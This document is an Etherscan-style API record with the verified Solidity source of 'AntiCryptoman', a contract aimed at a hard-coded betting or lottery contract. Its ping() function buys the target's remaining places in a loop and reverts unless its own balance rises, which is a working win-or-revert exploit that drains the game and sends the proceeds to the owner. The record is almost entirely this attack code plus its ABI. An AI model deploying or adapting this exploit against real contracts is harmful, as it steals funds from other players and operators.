{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.5.0;\r\n\r\ninterface TargetInterface {\r\n    function placesLeft() external view returns (uint256);\r\n}\r\n\r\ncontract AntiCryptoman {\r\n    \r\n    address payable targetAddress = 0x1Ef48854c57126085c2C9615329ED71fe159E390;\r\n    address payable private owner;\r\n    \r\n    modifier onlyOwner {\r\n        require(msg.sender == owner);\r\n        _;\r\n    }\r\n    \r\n    constructor() public payable {\r\n        owner = msg.sender;\r\n    }\r\n    \r\n    function ping(bool _toOwner) public payable onlyOwner {\r\n        TargetInterface target = TargetInterface(targetAddress);\r\n        uint256 placesLeft = target.placesLeft();\r\n        \r\n        require(placesLeft <= 7);\r\n        \r\n        uint256 betSize = 0.05 ether;\r\n        uint256 ourBalanceInitial = address(this).balance;\r\n        \r\n        for (uint256 ourBetIndex = 0; ourBetIndex < placesLeft; ourBetIndex++) {\r\n            (bool success, bytes memory data) = targetAddress.call.value(betSize)(\"\");\r\n            require(success);\r\n            data;\r\n        }\r\n        \r\n        require(address(this).balance > ourBalanceInitial);\r\n        \r\n        if (_toOwner) {\r\n            owner.transfer(address(this).balance);\r\n        }\r\n    }\r\n    \r\n    function withdraw() public onlyOwner {\r\n        owner.transfer(address(this).balance);\r\n    }    \r\n    \r\n    function kill() public onlyOwner {\r\n        selfdestruct(owner);\r\n    }    \r\n    \r\n    function () external payable {\r\n    }\r\n    \r\n}","ABI":"[{\"constant\":false,\"inputs\":[{\"name\":\"_toOwner\",\"type\":\"bool\"}],\"name\":\"ping\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"kill\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"AntiCryptoman","CompilerVersion":"v0.5.1+commit.c8a2cb62","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://532308a577e606883fb7e65291831dd8c034162fc28e19dd4d797c1ccb7abaf8"}]}